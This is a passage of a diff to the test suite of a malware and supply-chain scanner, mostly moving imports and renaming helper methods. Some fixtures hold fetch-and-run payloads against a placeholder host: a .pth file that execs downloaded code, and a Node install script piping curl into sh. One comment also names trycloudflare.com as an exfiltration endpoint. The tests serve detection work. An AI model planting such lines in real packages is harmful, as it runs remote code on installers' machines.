+        return TextPosition.is_local_target(content, 4)
 
     @pytest.mark.parametrize(
         "line",
@@ -8746,7 +8738,7 @@ class TestAFileNamedForAuthenticationOwnsWhatItReads:
 
     @staticmethod
     def _names(path: str) -> bool:
-        from cordon_scanner.engine.samples import SampleKinds
+        from cordon_scanner.foundation.samples import SampleKinds
 
         return SampleKinds.names_authentication(path)
 
@@ -9109,7 +9101,7 @@ class TestAskingWhetherAnAttributeExists:
     @staticmethod
     def _dispatch(source: str) -> list[str]:
         from cordon_scanner.analysis.python.pyast import PythonAnalyzer
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
 
         return [
             h.detail
@@ -9175,7 +9167,7 @@ class TestTheClassThatTurnedUpNothing:
         ],
     )
     def test_a_filename_saying_demo_is_read(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path)
 
@@ -9190,7 +9182,7 @@ class TestTheClassThatTurnedUpNothing:
         ],
     )
     def test_everything_else_is_still_source(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_test_material(path)
 
@@ -9564,7 +9556,7 @@ class TestTheMarkersAProjectPutsOnAKeyItGenerates:
         ],
     )
     def test_a_marked_key_is_graded(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path)
 
@@ -9584,7 +9576,7 @@ class TestTheMarkersAProjectPutsOnAKeyItGenerates:
         ],
     )
     def test_an_unmarked_key_still_reports_in_full(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_test_material(path)
 
@@ -9695,13 +9687,13 @@ class TestADelayIsNotACheck:
     """
 
     def test_the_primitive_is_its_own(self) -> None:
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
 
         assert Capability.DELAY.value == "delay"
         assert Capability.DELAY is not Capability.ANTI_ANALYSIS
 
     def test_the_delay_rule_carries_it(self) -> None:
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
         from cordon_scanner.rules.loader import RuleLoader, RuleSet
 
         rule = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == "CAP.ANTI.DELAY.001")
@@ -9710,7 +9702,7 @@ class TestADelayIsNotACheck:
     def test_no_composite_consumes_it_yet(self) -> None:
         """Stated as a test rather than left implicit, because the next person to add a
         composite over `delay` should have to delete this line and say why."""
-        from cordon_scanner.foundation.models import Capability, MatchKind
+        from cordon_scanner.foundation.capabilities import Capability, MatchKind
         from cordon_scanner.rules.loader import RuleLoader, RuleSet
 
         for compiled in RuleSet(RuleLoader.load_builtin()):
@@ -9925,7 +9917,7 @@ class TestAPublishedExploitIsPublishedToBeRun:
 
     @staticmethod
     def _exploit(raw: bytes) -> bool:
-        from cordon_scanner.engine.samples import SampleKinds
+        from cordon_scanner.foundation.samples import SampleKinds
 
         return SampleKinds.is_exploit_material(raw)
 
@@ -9966,7 +9958,7 @@ class TestAPublishedExploitIsPublishedToBeRun:
         # Asked at the INFO threshold, because that is where the ceiling puts it and the
         # default threshold would hide the very thing this asserts: the finding is still
         # there. A ceiling that dropped the finding would pass a weaker test.
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         config = Config.default().with_overrides(severity_threshold=Severity.INFO)
         found = [
@@ -10016,7 +10008,7 @@ class TestAKeyTheSitesOwnPlayerHolds:
 
     @staticmethod
     def _extractor(raw: bytes) -> bool:
-        from cordon_scanner.engine.samples import SampleKinds
+        from cordon_scanner.foundation.samples import SampleKinds
 
         return SampleKinds.is_media_extractor(raw)
 
@@ -10283,7 +10275,7 @@ class TestHowMuchOfARepositoryThePathPredicatesExcuse:
 
     @pytest.mark.parametrize("path", MATERIAL)
     def test_what_the_predicates_are_for(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material(path)
 
@@ -10291,14 +10283,14 @@ class TestHowMuchOfARepositoryThePathPredicatesExcuse:
     def test_and_what_they_must_not_reach(self, path: str) -> None:
         """Every one of these is production code that a marker word claimed. A Django data
         migration runs against the production database; a service is a service."""
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_test_material(path)
 
     def test_a_marker_means_something_only_on_a_key_or_a_config(self) -> None:
         """The rule that replaced the twelve words, stated directly: the same word, the
         same position, and the extension is what decides."""
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material("conf/local.key")
         assert SourcePaths.is_test_material("conf/local.yaml")
@@ -10312,7 +10304,7 @@ class TestHowMuchOfARepositoryThePathPredicatesExcuse:
 
         The number is deliberately close to what was measured, so that a later widening
         has to change this line and see the cost before paying it."""
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         apps = ("matters", "users", "intake", "advisory", "knowledge", "approvals")
         tree: list[str] = []
@@ -10919,7 +10911,7 @@ class TestAskingWhetherASettingIsSetIsNotReadingACredential:
     @staticmethod
     def _credentials(source: str) -> list[str]:
         from cordon_scanner.analysis.python.pyast import PythonAnalyzer
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
 
         return [
             hit.detail
@@ -11011,19 +11003,19 @@ class TestOneObservationIsOneFinding:
     def test_a_different_span_is_a_different_observation(self) -> None:
         """Only an identical span collapses. A second place in the same file
         that reads a credential and sends it is a second finding."""
-        from cordon_scanner.engine.engine import Engine
+        from cordon_scanner.engine.pipeline.results import ResultFolding
 
         first = self._at("MALWARE.EXFIL.001", 3)
         same = self._at("SUSPECT.EXFIL.001", 3)
         elsewhere = self._at("SUSPECT.EXFIL.001", 90)
-        kept = Engine._collapse_graded_pair((first, same, elsewhere))
+        kept = ResultFolding.graded_pair((first, same, elsewhere))
         assert [f.location.line for f in kept] == [3, 90]
 
     def test_an_unrelated_family_is_untouched(self) -> None:
-        from cordon_scanner.engine.engine import Engine
+        from cordon_scanner.engine.pipeline.results import ResultFolding
 
         pair = (self._at("MALWARE.EXFIL.001", 3), self._at("SUSPECT.DROPPER.001", 3))
-        assert len(Engine._collapse_graded_pair(pair)) == 2
+        assert len(ResultFolding.graded_pair(pair)) == 2
 
 
 class TestAHostEndsWhereTheStringEndsIt:
@@ -11337,7 +11329,7 @@ class TestNothingOwnsANetrc:
     def test_a_netrc_is_still_credential_material(self) -> None:
         """Removed from the two-signal rule, not from the primitive. This is the
         half that keeps the three-signal and install-hook rules seeing it."""
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
         from cordon_scanner.rules.loader import RuleLoader
 
         packs = RuleLoader.load_builtin()
@@ -11455,7 +11447,7 @@ class TestTestCasesIsATestDirectory:
         ],
     )
     def test_a_two_word_test_directory_is_one(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.names_test_directory(path)
 
@@ -11470,7 +11462,7 @@ class TestTestCasesIsATestDirectory:
         ],
     )
     def test_a_word_that_merely_contains_test_is_not(self, path: str) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.names_test_directory(path)
 
@@ -11556,7 +11548,7 @@ class TestAnUninstallerTakesThePersistenceAway:
         ],
     )
     def test_a_path_that_says_installer(self, path: str) -> None:
-        from cordon_scanner.engine.samples import SampleKinds
+        from cordon_scanner.foundation.samples import SampleKinds
 
         assert SampleKinds.names_installer(path)
 
@@ -11571,7 +11563,7 @@ class TestAnUninstallerTakesThePersistenceAway:
         ],
     )
     def test_a_path_that_merely_contains_one(self, path: str) -> None:
-        from cordon_scanner.engine.samples import SampleKinds
+        from cordon_scanner.foundation.samples import SampleKinds
 
         assert not SampleKinds.names_installer(path)
 
@@ -11641,16 +11633,15 @@ class TestWhatRealMalwareActuallyLooksLike:
         so the ceiling took `SUSPECT.DECODE_CHAIN.001` from critical to medium
         and a gate would have passed it. Python is not a language anybody
         minifies."""
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         long_line = b"x" * 6307
-        assert not CapabilityDetector._is_minified(
+        assert not BuildOutput.is_minified(
             FileContent(path="pkg/payload.py", raw=long_line, size=len(long_line))
         )
         # And the case the ceiling exists for is untouched: a bundler's output,
         # named with a content hash so no glob can see it.
-        assert CapabilityDetector._is_minified(
+        assert BuildOutput.is_minified(
             FileContent(path="assets/index-BTLZFAP9.js", raw=long_line, size=len(long_line))
         )
 
@@ -12024,14 +12015,13 @@ class TestTheSameActsInAnotherEcosystem:
     def test_a_real_bundle_is_still_minified(self, tmp_path) -> None:
         """The other direction, so the fix above does not simply remove the
         ceiling. A bundle is long lines and almost nothing else."""
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         bundle = ("var a=1,b=2,c=3;" * 400 + "\n") * 3
         content = FileContent(
             path="dist/app.min.js", raw=bundle.encode(), size=len(bundle.encode())
         )
-        assert CapabilityDetector._is_minified(content)
+        assert BuildOutput.is_minified(content)
 
     def test_a_signature_laid_out_one_parameter_to_a_line(self) -> None:
         """`_is_declaration` reads the rest of the line after the opening
@@ -12046,7 +12036,6 @@ class TestTheSameActsInAnotherEcosystem:
         `ICompletionsFetchService`. `fetch(` was read as a network call against
         a TypeScript interface. The Tailwind case the existing comment cites
         happens to be written on one line, which is why this went unnoticed."""
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         raw = (
@@ -12059,17 +12048,16 @@ class TestTheSameActsInAnotherEcosystem:
         )
         content = FileContent(path="service.ts", raw=raw, size=len(raw))
         start = raw.index(b"fetch(")
-        assert CapabilityDetector._is_declaration(content, start, start + len(b"fetch("))
+        assert TextPosition.is_declaration(content, start, start + len(b"fetch("))
 
     def test_a_call_written_the_same_way_is_not_a_declaration(self) -> None:
         """The control. An argument list broken over lines is still a call."""
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         raw = b'const r = await fetch(\n\t"https://example.com/a",\n\t{ method: "POST" }\n);\n'
         content = FileContent(path="call.ts", raw=raw, size=len(raw))
         start = raw.index(b"fetch(")
-        assert not CapabilityDetector._is_declaration(content, start, start + len(b"fetch("))
+        assert not TextPosition.is_declaration(content, start, start + len(b"fetch("))
 
     def test_proximity_is_not_defeated_by_a_minifier(self, tmp_path) -> None:
         """Proximity is a line count, and a minifier deletes lines.
@@ -12535,7 +12523,7 @@ class TestAModuleThatExplainsWhatItDrives:
     That is an accurate description of the tool the module drives, and
     `trycloudflare.com` is on the drop-point host list precisely because the
     property being described -- no account, reachable anywhere -- makes it a
-    good exfiltration endpoint. `_destination_capabilities` searched the raw
+    good exfiltration endpoint. `Labelling.destination_capabilities` searched the raw
     bytes and took the first hit, so the sentence counted as contacting it, and
     a `platform.machine()` call a hundred lines below completed the pair.
 
@@ -12729,16 +12717,16 @@ class TestAFixtureIsNotTheDistributionsInstaller:
         """mongodb vendors one at `src/third_party/wiredtiger/test/3rdparty/`
         and servo's is `tests/wpt/tests/tools/third_party/`. A rule that only
         looked at the top level would have caught one of the three."""
-        from cordon_scanner.engine.engine import Engine
+        from cordon_scanner.engine.pipeline.hooks import Hooks
 
-        assert Engine._under_fixture_directory("src/third_party/wiredtiger/test/x/setup.py")
-        assert Engine._under_fixture_directory("tests/wpt/tools/setup.py")
-        assert not Engine._under_fixture_directory("setup.py")
-        assert not Engine._under_fixture_directory("src/mylib/setup.py")
+        assert Hooks.under_fixture_directory("src/third_party/wiredtiger/test/x/setup.py")
+        assert Hooks.under_fixture_directory("tests/wpt/tools/setup.py")
+        assert not Hooks.under_fixture_directory("setup.py")
+        assert not Hooks.under_fixture_directory("src/mylib/setup.py")
 
 
 class TestTheAnchorAndTheCollapseAreDifferentQuestions:
-    """`Engine._collapse_idiom` groups on the evidence's hash, and `_anchor`
+    """`ResultFolding.idiom` groups on the evidence's hash, and `_anchor`
     moved the evidence. So the collapse silently stopped collapsing.
 
     `community-scripts/ProxmoxVE` ships six hundred container install scripts
@@ -12834,7 +12822,7 @@ class TestWhatShouldStopARelease:
 
     def _verdict(self, root):
         from cordon_scanner.decide.policy import PolicyGate
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         config = Config.default()
         return PolicyGate.evaluate(Scanner(config).scan(root), config.policy)
@@ -12857,7 +12845,7 @@ class TestWhatShouldStopARelease:
 
     def test_posture_is_reported_and_does_not_fail_the_build(self, tmp_path) -> None:
         self._write(tmp_path)
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default()).scan(tmp_path)
         rules = {f.rule_id for f in result.findings}
@@ -12878,7 +12866,7 @@ class TestWhatShouldStopARelease:
         not reach it: its category is the stronger claim about the same file.
         The category test runs first for exactly this reason."""
         from cordon_scanner.decide.policy import PolicyGate
-        from cordon_scanner.foundation.config import Policy
+        from cordon_scanner.foundation.config.policy import Policy
         from cordon_scanner.foundation.models import Category, Confidence, Severity
         from cordon_scanner.foundation.taxonomy import Taxonomy, ThreatDomain
 
@@ -12898,7 +12886,7 @@ class TestWhatShouldStopARelease:
         self._write(tmp_path)
         (tmp_path / "cordon.yaml").write_text("policy:\n  advisory_domains: []\n", encoding="utf-8")
         from cordon_scanner.decide.policy import PolicyGate
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         config = Config.discover(tmp_path)
         verdict = PolicyGate.evaluate(Scanner(config).scan(tmp_path), config.policy)
@@ -13043,7 +13031,7 @@ class TestHookFilesAreNotFixturesByAWordInTheirDirectory:
 
     def _scan(self, tmp_path, directory: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         package = tmp_path / directory
         package.mkdir(parents=True)
@@ -13078,7 +13066,7 @@ class TestHookFilesAreNotFixturesByAWordInTheirDirectory:
 class TestStartupFilesRunAtInstall:
     def test_a_pth_with_an_executed_payload_is_install_time_code(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "evil.pth").write_text(
             'import urllib.request as u;exec(u.urlopen("https://h.invalid/s").read())\n',
@@ -13094,7 +13082,7 @@ class TestStartupFilesRunAtInstall:
 
     def test_a_pth_of_paths_is_quiet(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "paths.pth").write_text("/opt/a\n../b\n", encoding="utf-8")
         findings = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path).findings
@@ -13155,7 +13143,7 @@ class TestRegistryAdvisoriesAreAboutRegistryPackages:
     def test_a_linked_package_is_not_matched_against_registry_malware(self, tmp_path) -> None:
         assert self._recorded_as_malware("eslint-plugin-react-internal", "0.0.0")
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "yarn.lock").write_text(
             '"eslint-plugin-react-internal@link:./scripts/eslint-rules":\n  version "0.0.0"\n  uid ""\n',
@@ -13172,7 +13160,7 @@ class TestRegistryAdvisoriesAreAboutRegistryPackages:
     def test_a_workspace_member_is_not_matched_against_registry_malware(self, tmp_path) -> None:
         assert self._recorded_as_malware("vitest-config", "5.56.0")
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "cloud").mkdir()
         (tmp_path / "vitest-config").mkdir()
@@ -13216,7 +13204,7 @@ class TestFetchAndRunOnRequest:
 
     def _severity(self, tmp_path, files: dict[str, str]) -> str | None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         for name, text in files.items():
             path = tmp_path / name
@@ -13281,7 +13269,7 @@ class TestFetchAndRunOnRequest:
 class TestOAuthClientIdentifiers:
     def _found(self, tmp_path, text: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "auth.go").write_text(text, encoding="utf-8")
         return [
@@ -13333,7 +13321,7 @@ class TestTheGoStandardLibraryIsADependency:
 
     def test_stdlib_raises_nothing_but_advisories(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "go.mod").write_text("module example.com/x\n\ngo 1.99.0\n", encoding="utf-8")
         findings = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path).findings
@@ -13429,7 +13417,7 @@ class TestAPublishedPackagesHookIsGradedByWhatItRuns:
         import tarfile
 
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         buffer = io.BytesIO()
         with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
@@ -13475,7 +13463,7 @@ class TestBeaconsOutsideAHook:
 
     def _severity(self, tmp_path, source: str) -> list[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "pkg").mkdir()
         (tmp_path / "pkg" / "__init__.py").write_text(source, encoding="utf-8")
@@ -13532,7 +13520,7 @@ class TestAFunctionHandedToACallIsReached:
 class TestAPackageNamedLikeAPopularOne:
     def _found(self, tmp_path, directory: str, name: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         root = tmp_path / directory
         root.mkdir(parents=True)
@@ -13563,7 +13551,7 @@ class TestAPackageNamedLikeAPopularOne:
 class TestMoreDecodersAndDestinations:
     def _rules(self, tmp_path, source: str) -> set[tuple[str, str]]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "mod.py").write_text(source, encoding="utf-8")
         return {
@@ -13604,11 +13592,10 @@ class TestMoreDecodersAndDestinations:
     def test_a_public_ip_literal_is_an_informative_destination(
         self, url: str, counted: bool
     ) -> None:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         content = FileContent.from_bytes("a.py", f'URL = "{url}"\n'.encode())
-        assert bool(CapabilityDetector._public_ip_url(content, "python")) is counted
+        assert bool(Labelling.public_ip_url(content, "python")) is counted
 
     @pytest.mark.parametrize(
         ("line", "counted"),
@@ -13624,11 +13611,10 @@ class TestMoreDecodersAndDestinations:
         ],
     )
     def test_a_public_ip_given_as_a_host_is_one_too(self, line: str, counted: bool) -> None:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
         from cordon_scanner.foundation.content import FileContent
 
         content = FileContent.from_bytes("a.js", f"{line}\n".encode())
-        assert bool(CapabilityDetector._public_ip_url(content, "javascript")) is counted
+        assert bool(Labelling.public_ip_url(content, "javascript")) is counted
 
 
 class TestAnInlineRequireRunsTheFile:
@@ -13647,7 +13633,7 @@ class TestAnInlineRequireRunsTheFile:
         import tarfile
 
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         payload = b"require('child_process').exec('curl -s https://h.invalid/x | sh')\n"
         buffer = io.BytesIO()
@@ -13723,7 +13709,7 @@ class TestEveryDropPointCanBeFound:
     behind it never runs for that host."""
 
     def test_each_host_passes_the_prefilter(self) -> None:
-        from cordon_scanner.intel.malware.hosts import ALL_HOSTS, Destinations
+        from cordon_scanner.analysis.shared.destinations import ALL_HOSTS, Destinations
 
         missing = [
             host
@@ -13739,7 +13725,7 @@ class TestEveryDropPointCanBeFound:
 class TestInstallCodeTooLargeToRead:
     def test_a_padded_setup_py_blocks(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "setup.py").write_text(
             "from setuptools import setup\nPAD = b'" + "A" * 300_000 + "'\nsetup(name='x')\n",
@@ -13755,7 +13741,7 @@ class TestInstallCodeTooLargeToRead:
 
     def test_a_large_ordinary_module_is_only_a_note(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "data.py").write_text("PAD = b'" + "A" * 300_000 + "'\n", encoding="utf-8")
         from cordon_scanner.foundation.limits import DEFAULT_LIMITS
@@ -13799,7 +13785,7 @@ class TestInfrastructureInTestMaterial:
 
     def _severities(self, tmp_path, rel: str) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         path = tmp_path / rel
         path.parent.mkdir(parents=True, exist_ok=True)
@@ -13822,7 +13808,7 @@ class TestInfrastructureInTestMaterial:
 class TestComputedNamesAtInstall:
     def _rules(self, tmp_path, files: dict[str, str]) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         for name, text in files.items():
             path = tmp_path / name
@@ -13872,7 +13858,7 @@ class TestResolvingYourOwnHostname:
 class TestATokenSentToItsOwnService:
     def _exfil(self, tmp_path, source: str) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "setup.py").write_text(
             source + "\nfrom setuptools import setup\nsetup(name='p')\n", encoding="utf-8"
@@ -13913,13 +13899,13 @@ class TestATokenSentToItsOwnService:
 
 class TestContentHashedBundlesAreBuildOutput:
     def test_a_webpack_chunk_is_generated(self) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_generated_artefact("jupyterlab/static/2874.ea9bd8ad31b1acb0.js")
         assert SourcePaths.is_generated_artefact("app/static/main-3f2a9c0d6c1b.css")
 
     def test_a_source_file_is_not(self) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert not SourcePaths.is_generated_artefact("src/handlers.js")
         assert not SourcePaths.is_generated_artefact("src/v2.handlers.js")
@@ -13929,7 +13915,7 @@ class TestAnOfficialInstallerIsSetup:
     @staticmethod
     def _dropper(tmp_path, url: str) -> list:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "scripts").mkdir()
         (tmp_path / "scripts" / "setup.ts").write_text(
@@ -13959,7 +13945,7 @@ class TestAnOfficialInstallerInADockerfile:
     @staticmethod
     def _severity(tmp_path, line: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "Dockerfile").write_text(f"FROM python:3.12\nRUN {line}\n", encoding="utf-8")
         found = [
@@ -13984,7 +13970,7 @@ class TestHarmlessFormsThePatternTierCannotSee:
     @staticmethod
     def _rules(tmp_path, name: str, source: str) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / name).write_text(source, encoding="utf-8")
         return {
@@ -14033,7 +14019,7 @@ class TestResolvingYourOwnNameUnderDotLocal:
     @staticmethod
     def _rules(tmp_path, lookup: str) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "interfaces.py").write_text(
             "import os, socket\n"
@@ -14059,7 +14045,7 @@ class TestResolvingYourOwnNameUnderDotLocal:
 
 class TestARunTestsScriptIsTestInfrastructure:
     def test_runtests_is_test_material(self) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_test_material("cython-3.3.0/runtests.py")
         assert not SourcePaths.is_test_material("cython-3.3.0/runner.py")
@@ -14076,7 +14062,7 @@ class TestAConstructorRunsWhenItsClassIsBuilt:
     @staticmethod
     def _beacon(tmp_path, source: str) -> list:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "tracker.py").write_text(source, encoding="utf-8")
         return [
@@ -14097,12 +14083,12 @@ class TestAConstructorRunsWhenItsClassIsBuilt:
 
 class TestViteBundlesAreBuildOutput:
     def test_a_vite_chunk_is_generated(self) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         assert SourcePaths.is_generated_artefact("streamlit/static/static/js/katex.B0YdJus7.js")
 
     def test_ordinary_names_are_not(self) -> None:
-        from cordon_scanner.detect.secrets.secrets import SourcePaths
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
 
         for path in (
             "src/react.development.js",
@@ -14126,7 +14112,7 @@ class TestTheNameOfASecretsNamespace:
 class TestTheLoadPathSkipsTheScriptBlock:
     def test_a_beacon_built_only_under_main_is_on_request(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "tracker.py").write_text(
             "import socket, requests\n"
@@ -14150,7 +14136,7 @@ class TestPayloadsTheDatasetShowedWereMissed:
     @staticmethod
     def _rules(tmp_path, files: dict[str, bytes | str]) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         for name, body in files.items():
             target = tmp_path / name
@@ -14333,7 +14319,7 @@ class TestHostileArchivesAndEncodings:
     @staticmethod
     def _rules(tmp_path) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         return {
             f.rule_id: f.severity.name
@@ -14381,7 +14367,7 @@ class TestInstallTimeCodeInEveryEcosystem:
     @staticmethod
     def _rules(tmp_path, files: dict[str, str]) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         for name, body in files.items():
             target = tmp_path / name
@@ -14422,7 +14408,7 @@ class TestInstallTimeCodeInEveryEcosystem:
 class TestAZeroTimeoutMeansNoBudget:
     def test_total_timeout_zero_scans_everything(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
         config = Config.default().with_overrides(use_cache=False)
@@ -14494,7 +14480,7 @@ class TestCompiledCodeRunsWhenTheProgramDoes:
     @staticmethod
     def _severity(tmp_path, source: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "update.go").write_text(source, encoding="utf-8")
         found = [
@@ -14519,7 +14505,7 @@ class TestCompiledCodeRunsWhenTheProgramDoes:
 class TestAGoPackageLevelInitialiserRunsOnImport:
     def test_var_initialiser_keeps_its_weight(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         source = (
             'package helper\n\nimport "os/exec"\n\nvar DdlXrFDZ = eGtROk()\n\n'
@@ -14541,7 +14527,7 @@ class TestNativeLoadTimeConstructors:
     @staticmethod
     def _severity(tmp_path, name: str, source: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / name).write_text(source, encoding="utf-8")
         found = [
@@ -14573,7 +14559,7 @@ class TestJavaScriptDownloadThenRun:
     @staticmethod
     def _rules(tmp_path, script: str) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "package.json").write_text(
             '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}',
@@ -14615,7 +14601,7 @@ class TestAnInteractionServiceCallback:
     @staticmethod
     def _rules(tmp_path, name: str, body: str) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         target = tmp_path / name
         target.parent.mkdir(parents=True, exist_ok=True)
@@ -14662,7 +14648,7 @@ class TestTheScannedPackageIsItselfAKnownMaliciousRelease:
     @staticmethod
     def _rules(root) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         return {
             f.rule_id
@@ -14689,7 +14675,7 @@ class TestInstallScriptsThatBringTheirPayload:
